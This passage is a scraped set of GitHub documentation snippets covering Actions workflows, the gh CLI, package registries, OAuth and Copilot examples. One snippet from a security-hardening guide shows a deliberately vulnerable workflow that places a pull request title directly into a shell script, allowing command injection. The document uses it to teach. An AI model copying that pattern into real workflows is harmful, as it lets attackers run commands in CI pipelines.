encoding=\"utf-8\"?>\n<configuration>\n <packageSources>\n   < clear />\n   <add key=\"example-nuget\" value=\"https://private_registry_url/nuget/example-nuget/index.json\" />\n </packageSources>\n</configuration>\n```\n\n----------------------------------------\n\nTITLE: Making a Shell Script Executable\nDESCRIPTION: This shell command uses `chmod` to add execute permissions to the `goodbye.sh` script. The `+x` option specifically grants execute permissions to the owner, group, and others for the specified file. This is necessary to run the script directly using `./goodbye.sh`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/composite-actions-executable-linux-mac.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nchmod +x goodbye.sh\n```\n\n----------------------------------------\n\nTITLE: Querying Project Items with GitHub CLI\nDESCRIPTION: This snippet uses the GitHub CLI to query the first 20 items in a GitHub project, including issues, pull requests, and draft issues. It retrieves field values for text, date, and single select fields within the first 8 fields of the project. The `PROJECT_ID` placeholder needs to be replaced with the actual project ID. Requires the `gh` CLI tool to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_14\n\nLANGUAGE: Shell\nCODE:\n```\ngh api graphql -f query='\\n  query{\\n    node(id: \"PROJECT_ID\") {\\n        ... on ProjectV2 {\\n          items(first: 20) {\\n            nodes{\\n              id\\n              fieldValues(first: 8) {\\n                nodes{\\n                  ... on ProjectV2ItemFieldTextValue {\\n                    text\\n                    field {\\n                      ... on ProjectV2FieldCommon {\\n                        name\\n                      }\\n                    }\\n                  }\\n                  ... on ProjectV2ItemFieldDateValue {\\n                    date\\n                    field {\\n                      ... on ProjectV2FieldCommon {\\n                        name\\n                      }\\n                    }\\n                  }\\n                  ... on ProjectV2ItemFieldSingleSelectValue {\\n                    name\\n                    field {\\n                      ... on ProjectV2FieldCommon {\\n                        name\\n                      }\\n                    }\\n                  }\\n                }\\n              }\\n              content{\\n                ... on DraftIssue {\\n                  title\\n                  body\\n                }\\n                ...on Issue {\\n                  title\\n                  assignees(first: 10) {\\n                    nodes{\\n                      login\\n                    }\\n                  }\\n                }\\n                ...on PullRequest {\\n                  title\\n                  assignees(first: 10) {\\n                    nodes{\\n                      login\\n                    }\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        }\\n      }\\n    }'\n```\n\n----------------------------------------\n\nTITLE: Running a Shell Script in Composite Action (YAML)\nDESCRIPTION: This snippet demonstrates how to execute a shell script as part of a composite action in GitHub Actions. It specifies the path to the script using `${{ github.action_path }}` or `$GITHUB_ACTION_PATH` and sets the shell to `bash`. The script will be executed within the action's repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nruns:\n  using: \"composite\"\n  steps:\n    - run: ${{ github.action_path }}/test/script.sh\n      shell: bash\n```\n\nLANGUAGE: yaml\nCODE:\n```\nruns:\n  using: \"composite\"\n  steps:\n    - run: $GITHUB_ACTION_PATH/script.sh\n      shell: bash\n```\n\n----------------------------------------\n\nTITLE: Checking OAuth Scopes with curl\nDESCRIPTION: This snippet demonstrates how to use `curl` to check the OAuth scopes associated with a token and the scopes accepted by an API action. The command sends a request with an authorization header and retrieves the response headers, which include `X-OAuth-Scopes` and `X-Accepted-OAuth-Scopes`.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/scopes-for-oauth-apps.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ curl -H \"Authorization: Bearer OAUTH-TOKEN\" {% data variables.product.rest_url %}/users/codertocat -I\nHTTP/2 200\nX-OAuth-Scopes: repo, user\nX-Accepted-OAuth-Scopes: user\n```\n\n----------------------------------------\n\nTITLE: Committing and pushing changes to the hook repository\nDESCRIPTION: This snippet demonstrates how to commit changes and push them to the repository designated for pre-receive hooks. The pre-receive hook must be located in the default branch.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngit commit -m \"YOUR COMMIT MESSAGE\"\ngit push\n```\n\n----------------------------------------\n\nTITLE: Access Token Response\nDESCRIPTION: Example response when polling for the access token.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\naccess_token=gho_16C7e42F292c6912E7710c838347Ae178B4a&token_type=bearer&scope=repo%2Cgist\n```\n\n----------------------------------------\n\nTITLE: Generating MinIO Access and Secret Keys (macOS Shell)\nDESCRIPTION: This snippet generates random access and secret keys for MinIO on macOS using `/dev/urandom`. These keys are used to authenticate with the MinIO server. They are stored as environment variables `MINIO_ACCESS_KEY` and `MINIO_SECRET_KEY`. The `tr`, `fold`, and `head` commands are used to generate a 32-character alphanumeric string.  LC_CTYPE=C is used to ensure consistent behavior across different locales.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-packages/quickstart-for-configuring-your-minio-storage-bucket-for-github-packages.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n$ export MINIO_ACCESS_KEY=$(cat /dev/urandom | LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)\n# this one is actually a secret, so careful\n$ export MINIO_SECRET_KEY=$(cat /dev/urandom | LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)\n```\n\n----------------------------------------\n\nTITLE: Using `inputs` context in Manually Triggered Workflow YAML\nDESCRIPTION: This YAML snippet shows an example of using the `inputs` context in a manually triggered workflow using the `workflow_dispatch` event. It defines input parameters `build_id`, `deploy_target`, and `perform_deploy`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_24\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_dispatch:\n    inputs:\n      build_id:\n        required: true\n        type: string\n      deploy_target:\n        required: true\n        type: string\n      perform_deploy:\n        required: true\n        type: boolean\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    if: ${{ inputs.perform_deploy }}\n    steps:\n      - name: Deploy build to target\n        run: echo \"Deploying build:${{ inputs.build_id }} to target:${{ inputs.deploy_target }}\"\n```\n\n----------------------------------------\n\nTITLE: Format Function Example - JavaScript\nDESCRIPTION: Demonstrates the usage of the `format` function in GitHub Actions expressions to replace placeholders in a string with specified values.  Escaping of curly braces is also shown.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nformat('Hello {0} {1} {2}', 'Mona', 'the', 'Octocat')\n```\n\nLANGUAGE: javascript\nCODE:\n```\nformat('{{Hello {0} {1} {2}!}}', 'Mona', 'the', 'Octocat')\n```\n\n----------------------------------------\n\nTITLE: Dry-Run Jenkins Pipeline Migration (Shell)\nDESCRIPTION: This command performs a dry run of a Jenkins pipeline migration using a specified Jenkinsfile. It allows you to preview the converted GitHub Actions workflow without actually creating a pull request. The `--output-dir` argument specifies the output directory for the converted workflow files, `--source-file-path` specifies the path to the Jenkinsfile, and `--source-url` specifies the Jenkins job URL.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run jenkins --output-dir path/to/output/ --source-file-path path/to/Jenkinsfile --source-url :url_to_jenkins_job\n```\n\n----------------------------------------\n\nTITLE: Excluding Directory with Paths-Ignore in YAML\nDESCRIPTION: This YAML snippet demonstrates how to exclude the `docs` directory from secret scanning using the `paths-ignore` configuration in a `secret_scanning.yml` file. This configuration tells secret scanning to automatically close alerts for any secrets found within the specified directory. The `paths-ignore` key is used to define an array of paths to exclude.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/using-advanced-secret-scanning-and-push-protection-features/excluding-folders-and-files-from-secret-scanning.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\npaths-ignore:\n  - \"docs/**\"\n```\n\n----------------------------------------\n\nTITLE: Generating a Certificate with OpenSSL\nDESCRIPTION: This command generates an X.509 certificate using OpenSSL, based on the provided certificate signing request (CSR) and private key.  The certificate is valid for 365 days and uses the SHA256 hashing algorithm. The generated certificate is saved as pfgh256.crt.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/configuring-authentication-and-provisioning-with-pingfederate.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nopenssl x509 -req -days 365 -sha256 -in MyCertificateRequest.csr -signkey MyPrivateKey.key -out pfgh256.crt\n```\n\n----------------------------------------\n\nTITLE: Configuring Kotlin DSL repository\nDESCRIPTION: This snippet shows how to configure a Kotlin DSL Gradle project to use a GitHub Packages repository. It defines the repository URL and credentials for accessing packages.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-gradle-registry.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nrepositories {\n    maven {\n        url = uri(\"https://{% ifversion fpt or ghec %}maven.pkg.github.com{% else %}REGISTRY_URL{% endif %}/OWNER/REPOSITORY\")\n        credentials {\n            username = project.findProperty(\"gpr.user\") as String? ?: System.getenv(\"USERNAME\")\n            password = project.findProperty(\"gpr.key\") as String? ?: System.getenv(\"TOKEN\")\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Publish to GitHub Packages Workflow - YAML\nDESCRIPTION: This workflow publishes a package to GitHub Packages upon a release event. It configures authentication using the GITHUB_TOKEN secret stored in the NODE_AUTH_TOKEN environment variable. The setup-node action creates an .npmrc file referencing the token for authentication with GitHub Packages.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-nodejs-packages.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nname: Publish package to GitHub Packages\non:\n  release:\n    types: [published]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      # Setup .npmrc file to publish to GitHub Packages\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '20.x'\n          registry-url: 'https://npm.pkg.github.com'\n          # Defaults to the user or organization that owns the workflow file\n          scope: '@octocat'\n      - run: npm ci\n      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Adding NuGet Package Reference in .csproj\nDESCRIPTION: This XML snippet shows how to add a NuGet package dependency to a .csproj file using the `<PackageReference>` element within an `<ItemGroup>`. Replace `PACKAGE_NAME` and `X.X.X` with the actual package name and version you want to install.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_12\n\nLANGUAGE: xml\nCODE:\n```\n<Project Sdk=\"Microsoft.NET.Sdk\">\n\n  <PropertyGroup>\n    <OutputType>Exe</OutputType>\n    <TargetFramework>netcoreapp3.0</TargetFramework>\n    <PackageId>My-app</PackageId>\n    <Version>1.0.0</Version>\n   <Authors>Octocat</Authors>\n    <Company>GitHub</Company>\n   <PackageDescription>This package adds an Octocat!</PackageDescription>\n    <RepositoryUrl>https://{% ifversion fpt or ghec %}github.com{% else %}HOSTNAME{% endif %}/OWNER/REPOSITORY</RepositoryUrl>\n  </PropertyGroup>\n\n  <ItemGroup>\n    <PackageReference Include=\"PACKAGE_NAME\" Version=\"X.X.X\" />\n  </ItemGroup>\n\n</Project>\n```\n\n----------------------------------------\n\nTITLE: Documenting C# Code with Comments using Copilot\nDESCRIPTION: This C# code snippet is an enhanced version of the previous example, with comments added by GitHub Copilot Chat to improve its understandability. The comments clarify the purpose of each method, explain the retry logic, and describe how the UI is updated across threads. It showcases how to use Copilot to create self-documenting code.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/documenting-code/explaining-complex-algorithms-or-logic.md#_snippet_1\n\nLANGUAGE: csharp\nCODE:\n```\n// Shared HttpClient instance for making HTTP requests (best practice for reuse)\nprivate static readonly HttpClient _client = new HttpClient();\n\n/// <summary>\n/// Fetches data from an API with retry mechanism and timeout functionality\n/// </summary>\n/// <param name=\"apiUrl\">The URL to fetch data from</param>\n/// <param name=\"cancellationToken\">Token to cancel the operation</param>\n/// <param name=\"maxRetries\">Maximum number of retry attempts</param>\n/// <param name=\"cancellationDelay\">Timeout duration in milliseconds</param>\n/// <param name=\"statusLabel\">UI label to show status updates</param>\npublic async Task<string> FetchDataFromApiWithRetryAsync(string apiUrl, CancellationToken cancellationToken, int maxRetries, int cancellationDelay, Label statusLabel)\n{\n    var retryCount = 0;\n    // Create a linked cancellation token that combines user cancellation and timeout\n    using var cts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);\n\n    while (retryCount < maxRetries)\n    {\n        try\n        {\n            // Set timeout for this attempt\n            cts.CancelAfter(cancellationDelay);\n            return await FetchDataFromApiAsync(cts.Token, statusLabel);\n        }\n        catch (Exception ex) when (!(ex is OperationCanceledException))\n        {\n            // If not the last retry attempt, implement exponential backoff\n            if (retryCount < maxRetries - 1) {\n                retryCount++;\n                // Exponential backoff: 2^retryCount seconds (1s, 2s, 4s, 8s, etc.)\n                int delay = (int)Math.Pow(2, retryCount) * 1000;\n                await Task.Delay(delay, cancellationToken);\n                UpdateStatusLabel($\"Retrying ({retryCount}/{maxRetries})...\", statusLabel);\n            } else {\n                // If all retries failed, throw exception with details\n                throw new Exception($\"Failed to fetch data after {maxRetries} retries: {ex.Message}\", ex);\n            }\n        }\n    }\n\n    // This is reached if maxRetries is 0 or some other unexpected case\n    throw new OperationCanceledException(\"The operation was cancelled.\", cts.Token);\n}\n\n/// <summary>\n/// Makes the actual API call to fetch data\n/// </summary>\nprivate async Task<string> FetchDataFromApiAsync(string apiUrl, CancellationToken cancellationToken, Label statusLabel)\n{\n    UpdateStatusLabel(\"Fetching data...\", statusLabel);\n\n    // Perform HTTP GET request with cancellation support\n    HttpResponseMessage response = await _client.GetAsync(apiUrl, cancellationToken);\n    response.EnsureSuccessStatusCode(); // Throws if response is not successful\n    string data = await response.Content.ReadAsStringAsync();\n\n    UpdateStatusLabel(\"Data fetched.\", statusLabel);\n    return data;\n}\n\n/// <summary>\n/// Updates UI label text safely across threads\n/// </summary>\n/// <param name=\"message\">The message to display</param>\n/// <param name=\"statusLabel\">The label control to update</param>\nprivate void UpdateStatusLabel(string message, Label statusLabel)\n{\n    // Check if we need to invoke on UI thread\n    if (statusLabel.InvokeRequired) {\n        // Use BeginInvoke to update label on UI thread\n        statusLabel.BeginInvoke(new Action<string, Label>(UpdateStatusLabel), message, statusLabel);\n    } else {\n        // Direct update if already on UI thread\n        statusLabel.Text = message;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using PowerShell shell with Secrets in GitHub Actions\nDESCRIPTION: This YAML snippet demonstrates how to use secrets in PowerShell within a GitHub Actions workflow. It sets a secret as an environment variable and uses it in a PowerShell command, quoting the variable for safety.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - shell: pwsh\n    env:\n      SUPER_SECRET: ${{ secrets.SuperSecret }}\n    run: |\n      example-command \"$env:SUPER_SECRET\"\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Inline Script Example - YAML\nDESCRIPTION: This example demonstrates a script injection vulnerability in a GitHub Actions workflow. The `run` command executes within a temporary shell script, and expressions inside `${{ }}` are evaluated and substituted with the resulting values. An attacker can inject commands by crafting a malicious pull request title.\nSOURCE: https://github.com/github/docs/blob/main/content/enterprise-onboarding/github-actions-for-your-enterprise/security-hardening-for-github-actions.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n      - name: Check PR title\n        run: |\n          title=\"${{ github.event.pull_request.title }}\"\n          if [[ $title =~ ^octocat ]]; then\n          echo \"PR title starts with 'octocat'\"\n          exit 0\n          else\n          echo \"PR title did not start with 'octocat'\"\n          exit 1\n          fi\n```\n\n----------------------------------------\n\nTITLE: Committing Changes\nDESCRIPTION: This command commits the staged changes to the local repository.  The `-m` flag specifies the commit message. The message should include a concise title (max 72 characters) and an optional, more detailed description separated by a blank line.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\ngit commit -m \"Commit message title (max 72 characters)\n\n   Optional fuller description of what changed (no character limit).\n   Note the empty line between the title and the description,\n   and the closing quotation mark at the end of the commit message.\"\n```\n\n----------------------------------------\n\nTITLE: Checking Copilot activity and creating issues (Shell)\nDESCRIPTION: This Shell script fetches GitHub Copilot seat assignments, parses the data, checks for user inactivity, and creates reminder issues if necessary. It utilizes `gh api` to interact with the GitHub API and `gh issue` to manage issues. It requires the `jq` command-line JSON processor to be installed. It accesses the `COPILOT_LICENSE_READ` secret and `GITHUB_TOKEN` secret.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/rolling-out-github-copilot-at-scale/reminding-inactive-users.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n# List all GitHub Copilot seat assignments for an organization\nRESPONSE=$(gh api \\\n  -H \"Accept: application/vnd.github+json\" \\\n  -H \"X-GitHub-Api-Version: 2022-11-28\" \\\n  -H \"Authorization: Bearer {% raw %}${{ secrets.COPILOT_LICENSE_READ }}{% endraw %}\" \\\n  /orgs/{% raw %}${{ github.repository_owner }}{% endraw %}/copilot/billing/seats)\necho \"Raw Response from gh api:\"\necho \"$RESPONSE\"\n\n# Parse and check each user's `last_activity_at` and `created_at`\necho \"$RESPONSE\" | jq -c '.seats[]' | while read -r seat; do\n  LOGIN=$(echo \"$seat\" | jq -r '.assignee.login')\n  LAST_ACTIVITY=$(echo \"$seat\" | jq -r '.last_activity_at')\n  CREATED_AT=$(echo \"$seat\" | jq -r '.created_at')\n\n  # List all open issues with label `copilot-reminder`\n  EXISTING_ISSUES=$(gh issue list --repo {% raw %}${{ github.repository }}{% endraw %} --assignee $LOGIN --label 'copilot-reminder' --json id)\n\n  # Get last activity date and convert dates to seconds since epoch for comparison\n  if [ \"$LAST_ACTIVITY\" = \"null\" ]; then\n    LAST_ACTIVITY_DATE=$(date -d \"$CREATED_AT\" +%s)\n  else\n    LAST_ACTIVITY_DATE=$(date -d \"$LAST_ACTIVITY\" +%s)\n  fi\n  THIRTY_DAYS_AGO=$(date -d \"30 days ago\" +%s)\n\n  # Create issues for inactive users who don't have an existing open issue\n  if [ \"$LAST_ACTIVITY_DATE\" -lt \"$THIRTY_DAYS_AGO\" ] && [ \"$EXISTING_ISSUES\" = \"[]\" ]; then\n    echo \"User $LOGIN has not been active in the last 30 days. Last activity: $LAST_ACTIVITY\"\n\n    NEW_ISSUE_URL=\"$(gh issue create --title \\\"Reminder about your GitHub Copilot license\\\" --body \\\"{% raw %}${{ vars.COPILOT_REMINDER_MESSAGE }}{% endraw %}\\\" --repo {% raw %}${{ github.repository }}{% endraw %} --assignee $LOGIN --label 'copilot-reminder')\"\n  else\n    echo \"User $LOGIN is active or already has an assigned reminder issue. Last activity: $LAST_ACTIVITY\"\n  fi\ndone\n```\n\n----------------------------------------\n\nTITLE: Running git blame with ignore-revs-file\nDESCRIPTION: This command runs `git blame` locally, instructing it to ignore revisions specified in the `.git-blame-ignore-revs` file. This ensures that the local blame output matches the blame view on GitHub, providing a consistent experience for developers.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/using-files/viewing-and-understanding-files.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit blame --ignore-revs-file .git-blame-ignore-revs\n```\n\n----------------------------------------\n\nTITLE: Iterating through paginated results one page at a time\nDESCRIPTION: This code demonstrates how to use `octokit.paginate.iterator()` to process GitHub API responses one page at a time. It iterates through issues, extracts titles and authors, and stops iteration when an issue title includes \"test\". This approach is memory-efficient for handling large datasets.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nconst iterator = octokit.paginate.iterator(\"GET /repos/{owner}/{repo}/issues\", {\n  owner: \"github\",\n  repo: \"docs\",\n  per_page: 100,\n  headers: {\n    \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n  },\n});\n\nlet issueData = []\nlet breakLoop = false\nfor await (const {data} of iterator) {\n  if (breakLoop) break\n  for (const issue of data) {\n    if (issue.title.includes(\"test\")) {\n      breakLoop = true\n      break\n    } else {\n      issueData = [...issueData, {title: issue.title, author: issue.user.login}];\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Specifying Organization Runner Group in Workflow (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to specify a runner group named 'my-group' within an organization scope using the `runs-on` directive. The `group` key is set to 'org/my-group' to target the organizational runner group. The snippet also includes example labels.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/using-prefixes-to-differentiate-runner-groups.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nruns-on:\n  group: org/my-group\n  labels: [ self-hosted, label-1 ]\n```\n\n----------------------------------------\n\nTITLE: Git Push Rejected Due to Non-Fast-Forward\nDESCRIPTION: This code snippet shows the error message received when a `git push` command is rejected due to a non-fast-forward condition. This occurs when the remote branch has diverged from the local branch, and Git prevents the push to avoid overwriting changes. The user needs Git installed to reproduce this output. The input is a `git push` command when the condition is met. The output is the error message shown in the snippet.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/dealing-with-non-fast-forward-errors.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ git push origin main\n> To https://{% data variables.product.product_url %}/USERNAME/REPOSITORY.git\n>  ! [rejected]        main -> main (non-fast-forward)\n> error: failed to push some refs to 'https://{% data variables.product.product_url %}/USERNAME/REPOSITORY.git'\n> To prevent you from losing history, non-fast-forward updates were rejected\n> Merge the remote changes (e.g. 'git pull') before pushing again. See the\n> 'Note about fast-forwards' section of 'git push --help' for details.\n```\n\n----------------------------------------\n\nTITLE: Validating SCIM Operation with Curl\nDESCRIPTION: This snippet demonstrates how to validate the SCIM setup by making a GET request to the `/api/v3/scim/v2/Users` endpoint. It requires a personal access token with `admin:enterprise` scope and the hostname of the GitHub Enterprise Server instance. The expected output is an empty array, indicating that no users are currently provisioned via SCIM.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/user-provisioning-with-scim-on-ghes.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ GHES_PAT=\"PAT FROM STEP 3\"\n$ GHES_HOSTNAME=\"YOUR INSTANCE'S HOSTNAME\"\n$ curl --location --request GET 'https://$GHES_HOSTNAME/api/v3/scim/v2/Users' \\\n    --header 'Content-Type: application/scim' \\\n    --header 'Authorization: Bearer $GHES_PAT'\n```\n\n----------------------------------------\n\nTITLE: Creating a New .NET Console Project\nDESCRIPTION: This command creates a new .NET console project with a specified name. The `dotnet new console` command initializes a basic console application, and the `--name` option sets the project's name. Replace `PROJECT_NAME` with your desired project name.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ndotnet new console --name PROJECT_NAME\n```\n\n----------------------------------------\n\nTITLE: Conditional Workflow Job for Multi-Architecture Container Images (YAML)\nDESCRIPTION: This workflow job runs only for the event that contains the actual image tag information when pushing multi-architecture container images. It uses a conditional to check if the container metadata tag name is not empty.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_41\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n    job_name:\n        if: ${{ github.event.registry_package.package_version.container_metadata.tag.name != '' }}\n```\n\n----------------------------------------\n\nTITLE: Defining Action Metadata in YAML\nDESCRIPTION: This YAML file defines the metadata for the GitHub Action. It specifies the action's name, description, inputs (`who-to-greet`), outputs (`time`), and the runtime environment (`node20`) along with the entry point (`index.js`).\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-javascript-action.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: 'Hello World'\ndescription: 'Greet someone and record the time'\ninputs:\n  who-to-greet:  # id of input\n    description: 'Who to greet'\n    required: true\n    default: 'World'\noutputs:\n  time: # id of output\n    description: 'The time we greeted you'\nruns:\n  using: 'node20'\n  main: 'index.js'\n```\n\n----------------------------------------\n\nTITLE: Migrate CircleCI with config file\nDESCRIPTION: This command migrates a CircleCI project to GitHub Actions, using a specified YAML configuration file to determine the target repositories for converted composite actions. It opens a pull request in each unique repository defined in the config file, using the specified `target-url`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer migrate circle-ci --circle-ci-project my-project-name --output-dir output/ --config-file-path config.yml --target-url https://github.com/my-org/my-repo\n```\n\n----------------------------------------\n\nTITLE: Targeting macOS runners in a workflow\nDESCRIPTION: This YAML snippet demonstrates how to target macOS runners in a GitHub Actions workflow by setting the `runs-on` key to a label associated with a macOS runner, specifically `macos-13-xlarge`. It showcases a build and test workflow for a Swift project.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/using-github-hosted-runners/using-larger-runners/running-jobs-on-larger-runners.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: learn-github-actions-testing\non: [push]\njobs:\n  build:\n    runs-on: macos-13-xlarge\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Build\n        run: swift build\n      - name: Run tests\n        run: swift test\n```\n\n----------------------------------------\n\nTITLE: Bypassing the commit hook\nDESCRIPTION: This command bypasses the git commit hook when committing changes, useful when the linter catches errors that were not introduced by the user.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngit commit -m 'MESSAGE' --no-verify\n```\n\n----------------------------------------\n\nTITLE: Listing Helm Deployments\nDESCRIPTION: This snippet uses the `helm list` command to display all Helm deployments across all namespaces, which helps verify the installation status of the runner scale sets.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nhelm list -A\n```\n\n----------------------------------------\n\nTITLE: IAM Trust Policy Condition Update (JSON)\nDESCRIPTION: This JSON snippet shows the required condition within the IAM role's trust policy. It includes the `sub` claim and checks that the audience and subject match the GHES instance. Replace `HOSTNAME` with the GHES public hostname.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/enabling-github-actions-for-github-enterprise-server/enabling-github-actions-with-amazon-s3-storage.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  ...\n  \"Condition\": {\n    \"StringEquals\": {\n      \"HOSTNAME/_services/token:aud\": \"sts.amazonaws.com\",\n      \"HOSTNAME/_services/token:sub\": \"HOSTNAME\"\n    }\n  }\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Making a Script Executable (Windows) within Same Repo\nDESCRIPTION: Marks the `goodbye.sh` script as executable using `git add --chmod=+x`. This is essential for allowing the script to be executed as a program within the composite action on Windows systems. The `--chmod=+x` option modifies the file's permissions to allow execution.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\ngit add --chmod=+x -- goodbye.sh\n```\n\n----------------------------------------\n\nTITLE: Define Workflow to Add PR to Project\nDESCRIPTION: Defines a GitHub Actions workflow triggered when a pull request is marked as 'ready for review'. The workflow includes jobs to track the pull request and add it to a specific project. It sets up the necessary configurations, including organization, project number and secrets to authenticate against the Github API.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/automating-projects-using-actions.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# This workflow runs whenever a pull request in the repository is marked as \"ready for review\".\nname: Add PR to project\non:\n  pull_request:\n    types:\n      - ready_for_review\njobs:\n  track_pr:\n    runs-on: ubuntu-latest\n    steps:\n    # Sets environment variables for this step.\n    #\n    # If you are using a {% data variables.product.pat_generic %}, replace `YOUR_TOKEN` with the name of the secret that contains your {% data variables.product.pat_generic %}.\n    #\n    # Replace `YOUR_ORGANIZATION` with the name of your organization. For example, `octo-org`.\n    #\n    # Replace `YOUR_PROJECT_NUMBER` with your project number. To find the project number, look at the project URL. For example, `https://github.com/orgs/octo-org/projects/5` has a project number of 5.\n```\n\n----------------------------------------\n\nTITLE: Refactoring JavaScript for Code Reusability\nDESCRIPTION: This JavaScript code calculates total sales by summing the product of apple and orange sales. It demonstrates repeated calculations that can be refactored into a reusable function. This improves maintainability and reduces redundancy.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nlet 